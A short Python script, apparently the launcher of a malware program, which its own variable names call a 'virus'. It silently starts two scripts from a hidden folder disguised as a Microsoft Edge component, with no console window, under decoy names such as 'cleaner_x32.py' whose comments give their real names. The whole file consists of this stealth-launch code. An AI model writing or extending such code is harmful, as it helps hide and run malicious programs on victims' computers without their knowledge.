import subprocess, sys, os

home_dir = os.path.expanduser("~")
appdata = os.environ['APPDATA']

virus_dir = os.path.join(
    home_dir,
    ".temp",
    "Microsoft_Edge_x64",
    "utils"
)

subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleaner_x32.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is file_checker.py
subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleanup_x64.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is gama_aaa.py